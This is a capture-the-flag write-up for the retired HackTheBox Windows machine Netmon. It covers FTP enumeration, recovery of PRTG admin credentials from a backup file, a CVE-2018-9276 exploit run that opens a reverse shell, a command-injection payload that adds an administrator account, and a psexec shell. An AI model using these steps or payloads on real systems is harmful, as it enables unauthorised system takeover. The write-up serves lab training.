# Netmon - Windows, easy (10.10.10.152)

### Enumeration
```
ORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### User flag
Just connect using ftp to the server and enter in \Users\Public to get file `user.txt` (just type `get user.txt` to download a copy).

### Privesc
For this part I have checked the website and here I could notice that it is hosting `PRTG Network Monitor 18.1.37.13946` and we are presented with a loging form.
Looking for exploits online there's not much we can do for now since they all require credentials.

My guess is to check the common files of PRTG through ftp.
[Here](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) we can see some folders and files that could be useful for us.
In particular, `%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor` is the data folder where we can check for configuration files.
In fact, a file that could be useful is `PRTG Configuration.old` which is the backup of previous version of monitoring configuration.

Login again as anynimous user using ftp and then in `\Users` type `ls -al` otherwise some folders and files are not shown.
```
ftp> ls -al
229 Entering Extended Passive Mode (|||50522|)
150 Opening ASCII mode data connection.
02-25-19  11:44PM       <DIR>          Administrator
07-16-16  09:28AM       <DIR>          All Users
02-03-19  08:05AM       <DIR>          Default
07-16-16  09:28AM       <DIR>          Default User
07-16-16  09:16AM                  174 desktop.ini
09-10-22  04:07PM       <DIR>          Public
```

Now enter in `\All Users\Paessler\PRTG Network Monitor` and get file `PRTG Configuration.old`. Unfortunately here there's nothing, but in `PRTG Configuration.old.bak` we can notice the following credentials:
```
<!-- User: prtgadmin -->
PrTg@dmin2018
```

However the credentials did not work, but thinking at the situation, the file from which we obtained the credentials is an old backup, ending in 2018, but the machine
was released on HTB on `02 Mar 2019`, so, trying with 2019 instead of 2018 allows us to access correctly to the PRTG Dashboard as System Administrator!

At this point we can utilize the exploits found previously since we have a valid username and password.
In particular, I found [CVE-2018-9276](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9276) that allows us to exploit an OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.
I used the following [script](https://github.com/A1vinSmith/CVE-2018-9276):
```
kali@kali:~/HackTheBox/retired/Windows/easy/Netmon/CVE-2018-9276$ ./exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.14.13 --lport 4444 --user prtgadmin --password PrTg@dmin2019

nc -nlvp 4444
C:\Windows\system32>whoami
whoami
nt authority\system
```

### Manual privesc
[This](https://www.codewatch.org/blog/?p=453) blog post about command injection in PRTG explain how to perform command injection in the parameter field of the notifications configuration with some of the default Demo scripts.

After login, enter in `Setup > Account Settings > Notifications`, click the blue cross on the right and click on `Add new notification`.
Following the blog post, scroll down to `Execute Program` and click on it.
For the `Program File` use `Demo exe notification - outfile.ps1` and then in field `Parameter` add `test.txt;net user hollow p3nT3st! /add;net localgroup administrators hollow /add` where the second part is not present on the blog post, but I needed it in order to add my new user to adminsitrators group.

At this point save the notification, click the button on the right (pen in a square) and click the bell icon to send test notification.
We can check if we have access by using:
```
kali@kali:~$ smbmap -H 10.10.10.152 -u pentest -p "p3nT3st!"
[+] IP: 10.10.10.152:445        Name: 10.10.10.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```
and we have it!

To get a shell we can use `psexec.py`:
```
kali@kali:~$ sudo psexec.py 'hollow:p3nT3st!@10.10.10.152'
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file tLYZnnku.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service VhkJ on 10.10.10.152.....
[*] Starting service VhkJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Done ✔️
